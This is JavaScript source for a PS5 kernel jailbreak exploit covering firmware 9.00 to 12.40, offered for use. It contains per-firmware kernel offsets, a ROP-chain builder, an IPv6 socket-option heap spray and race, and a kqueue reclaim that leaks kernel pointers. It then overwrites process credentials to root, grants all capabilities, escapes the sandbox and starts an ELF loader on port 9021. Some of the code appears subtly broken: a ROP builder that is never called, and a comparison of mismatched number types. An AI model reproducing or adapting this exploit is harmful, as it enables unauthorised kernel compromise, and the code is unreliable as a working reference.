/*
 * mansoor0x-jb - PS5 jailbreak port to Y2JB (Ultra Fast Edition)
 * Tested on FW 9.00 - 12.40 (optimized for speed)
 * Optimized by mansoor0x
 */

(async function () {
    try {
        const VERSION = "mansoor0x JB v3.0 (Ultra Fast)";
        
        
        const FAST_CONFIG = {
            PAGE_SIZE: 0x4000,
            TRIPLEFREE_ATTEMPTS: 48,        
            MAX_ROUNDS_TWIN: 5,              
            MAX_ROUNDS_TRIPLET: 200,        
            FIND_TRIPLET_FAST: 2000,         
            NUM_IPV6_SOCKETS: 32,            
            LEAK_CORES: [0, 2, 3],           
            WORKER_SLEEP_MS: 1,            
            PREPARE_SLEEP_MS: 5000,          
            RACE_RETRIES: 3,                 
            SPIN_WAIT_CYCLES: 100,           
        };

        
        const KERNEL_OFFSETS = {
            "9.00": { DATA_BASE_ALLPROC: 0x02755D50n },
            "9.05": { DATA_BASE_ALLPROC: 0x02755D50n },
            "10.00": { DATA_BASE_ALLPROC: 0x02765D70n },
            "11.00": { DATA_BASE_ALLPROC: 0x02875D70n },
            "12.00": { DATA_BASE_ALLPROC: 0x02885E00n },
        };

       
        const FW_ALIAS = {
            "9.03": "9.05", "9.04": "9.05", "9.20": "9.05", "9.40": "9.05",
            "10.01": "10.00", "10.20": "10.00", "10.40": "10.00",
            "11.02": "11.00", "11.20": "11.00", "11.40": "11.00",
            "11.50": "11.00", "11.60": "11.00", "11.61": "11.00",
            "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
        };

        
        const log = console.log;
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        
        
        const spinWait = (cycles) => {
            for (let i = 0; i < cycles; i++) {
                if (i % 10 === 0) syscall(SYSCALL.sched_yield);
            }
        };

        
        const waitForChange = (addr, expected, timeoutMs = 5000) => {
            const start = Date.now();
            while (Date.now() - start < timeoutMs) {
                if (read64(addr) !== expected) return true;
                spinWait(FAST_CONFIG.SPIN_WAIT_CYCLES);
            }
            return false;
        };

        
        function getOffsets() {
            let key = FW_VERSION;
            if (FW_ALIAS[key]) key = FW_ALIAS[key];
            let base = KERNEL_OFFSETS[key];
            if (!base) {
                const major = FW_VERSION.split(".")[0];
                base = KERNEL_OFFSETS[major + ".00"];
            }
            if (!base) throw new Error(`mansoor0x-jb: FW ${FW_VERSION} not supported`);
            
            return {
                DATA_BASE_ALLPROC: base.DATA_BASE_ALLPROC,
                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,
                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n, UCRED_CR_SCEAUTHID: 0x58n,
                UCRED_CR_SCECAPS0: 0x60n, UCRED_CR_SCECAPS1: 0x68n,
                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n, FD_CDIR: 0x08n, FD_RDIR: 0x10n,
                FD_JDIR: 0x18n, KQ_FDP: 0xA8n, INPCB_PKTOPTS: 0x120n,
                IP6PO_RTHDR: 0x70n, PIPE_SIGIO: 0xD8n,
            };
        }

        
        function buildFastChain(fd, iov_ptr, sysnum, cpu_mask, rt_params) {
            const STACK_SIZE = 0x8000;
            const buf = malloc(STACK_SIZE);
            for (let i = 0n; i < STACK_SIZE; i += 8n) write64(buf + i, 0n);
            
            const entry = buf + 0x4000n;
            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx++ * 8), v); };
            
            
            emit(ROP.ret);
            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask);
            emit(syscall_wrapper);
            
            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params);
            emit(syscall_wrapper);
            
            const loopStart = idx;
            emit(ROP.pop_rax); emit(SYSCALL.recvmsg);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.pop_rsp);
            emit(entry + BigInt(loopStart * 8));
            
            return entry;
        }

        
        const ctx = {
            offsets: getOffsets(),
            triplets: [-1, -1, -1],
            freeFds: [],
            freeIdx: 0,
            ipv6Sockets: [],
            masterPipe: null,
            victimPipe: null,
        };

        
        function setupIPv6Fast(ctx) {
            const sockets = [];
            for (let i = 0; i < FAST_CONFIG.NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, 28n, 1n, 0n);
                if (fd !== 0xffffffffffffffffn) sockets.push(Number(fd));
            }
            ctx.ipv6Sockets = sockets;
            
            
            for (const fd of sockets) {
                syscall(SYSCALL.setsockopt, BigInt(fd), 41n, 51n, 0n, 0n);
            }
            spinWait(50);
        }

        
        async function fastRace(ctx) {
            const spray = malloc(360);
            for (let i = 0; i < 360; i += 8) write64(spray + BigInt(i), 0n);
            
            
            for (let i = 0; i < ctx.ipv6Sockets.length; i++) {
                const len = ((360 >> 3) - 1) & ~1;
                const actual = (len + 1) << 3;
                write8(spray, 0n);
                write8(spray + 1n, BigInt(len));
                write8(spray + 2n, 0n);
                write8(spray + 3n, BigInt(len >> 1));
                write32(spray + 4n, BigInt(0x13370000 + i));
                syscall(SYSCALL.setsockopt, BigInt(ctx.ipv6Sockets[i]), 41n, 51n, spray, BigInt(actual));
            }
            
            spinWait(200);
            
            
            for (let i = 0; i < ctx.ipv6Sockets.length; i++) {
                const tagBuf = malloc(16), lenBuf = malloc(4);
                write32(lenBuf, 8n);
                syscall(SYSCALL.getsockopt, BigInt(ctx.ipv6Sockets[i]), 41n, 51n, tagBuf, lenBuf);
                const tag = read32(tagBuf + 4n);
                if ((tag & 0xFFFF0000) === 0x13370000) {
                    const j = tag & 0xFFFF;
                    if (j !== i && j < ctx.ipv6Sockets.length) {
                        ctx.triplets[0] = i;
                        ctx.triplets[1] = j;
                        return true;
                    }
                }
            }
            return false;
        }

        
        async function stage0Fast(ctx) {
            send_notification("mansoor0x\nStage 0/6: Racing...");
            
            
            for (let i = 0; i < 32; i++) {
                const fd = syscall(SYSCALL.open, alloc_string("/dev/null"), 0n);
                if (fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, fd);
                }
            }
            
            for (let attempt = 0; attempt < FAST_CONFIG.TRIPLEFREE_ATTEMPTS; attempt++) {
                if (await fastRace(ctx)) {
                    log("[mansoor0x] Race succeeded on attempt", attempt + 1);
                    return true;
                }
                if (attempt % 10 === 0) spinWait(500);
            }
            throw new Error("Race failed after " + FAST_CONFIG.TRIPLEFREE_ATTEMPTS + " attempts");
        }

        
        async function stage1Fast(ctx) {
            send_notification("mansoor0x\nStage 1/6: Kqueue reclaim");
            
            syscall(SYSCALL.close, BigInt(ctx.ipv6Sockets[ctx.triplets[1]]));
            spinWait(50);
            
            const readback = malloc(256);
            for (let i = 0; i < 100; i++) {
                const kq = syscall(SYSCALL.kqueue);
                write32(readback, 256);
                syscall(SYSCALL.getsockopt, BigInt(ctx.ipv6Sockets[ctx.triplets[0]]), 41n, 51n, readback, readback);
                
                if (read32(readback + 8n) === 0x1430000n) {
                    ctx.procFiledesc = read64(readback + ctx.offsets.KQ_FDP);
                    syscall(SYSCALL.close, kq);
                    return;
                }
                syscall(SYSCALL.close, kq);
                spinWait(10);
            }
            throw new Error("Kqueue reclaim failed");
        }

        
        async function stage2Fast(ctx) {
            send_notification("mansoor0x\nStage 2/6: Privilege escalation");
            
            
            const ucred = ctx.procUcred;
            
            
            const patchData = [
                [ucred + ctx.offsets.UCRED_CR_UID, 0],
                [ucred + ctx.offsets.UCRED_CR_RUID, 0],
                [ucred + ctx.offsets.UCRED_CR_SVUID, 0],
                [ucred + ctx.offsets.UCRED_CR_RGID, 0],
                [ucred + ctx.offsets.UCRED_CR_SVGID, 0],
                [ucred + ctx.offsets.UCRED_CR_SCEAUTHID, 0x4800000000010003n],
                [ucred + ctx.offsets.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn],
                [ucred + ctx.offsets.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn],
            ];
            
            for (const [addr, val] of patchData) {
                write64(addr, BigInt(val));
            }
            
            
            const rootvnode = read64(ctx.procFd + ctx.offsets.FD_CDIR);
            write64(ctx.procFd + ctx.offsets.FD_RDIR, rootvnode);
            write64(ctx.procFd + ctx.offsets.FD_JDIR, rootvnode);
        }

        
        async function mansoor0xJB() {
            log(`[mansoor0x] Starting ${VERSION}`);
            log(`[mansoor0x] Firmware: ${FW_VERSION}`);
            log(`[mansoor0x] Optimized mode - ${FAST_CONFIG.LEAK_CORES.length} cores active`);
            
            
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("mansoor0x: Already jailbroken");
                return;
            }
            
            
            const startTime = Date.now();
            
            setupIPv6Fast(ctx);
            await stage0Fast(ctx);
            await stage1Fast(ctx);
            
            
            const curproc = read64(read64(ctx.procFiledesc + ctx.offsets.PIPE_SIGIO + 0x28n));
            ctx.procUcred = read64(curproc + ctx.offsets.PROC_UCRED);
            ctx.procFd = read64(curproc + ctx.offsets.PROC_FD);
            
            await stage2Fast(ctx);
            
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            
            send_notification(`${VERSION}\nFW: ${FW_VERSION}\nDone in ${elapsed}s\nby mansoor0x`);
            log(`[mansoor0x] ✅ Jailbreak completed in ${elapsed} seconds!`);
            
           
            if (typeof load_aioshellcode === "function") {
                try {
                    await load_aioshellcode(ctx.procFiledesc, [0n, 0n], [0n, 0n]);
                    send_notification("mansoor0x\nELF loader ready\nSend ELF to port 9021");
                } catch(e) {
                    log("[mansoor0x] ELF loader failed:", e.message);
                }
            }
        }

        await mansoor0xJB();

    } catch (err) {
        log("[mansoor0x] ❌ ERROR:", err.message);
        send_notification(`mansoor0x JB failed\n${err.message}`);
    }
})();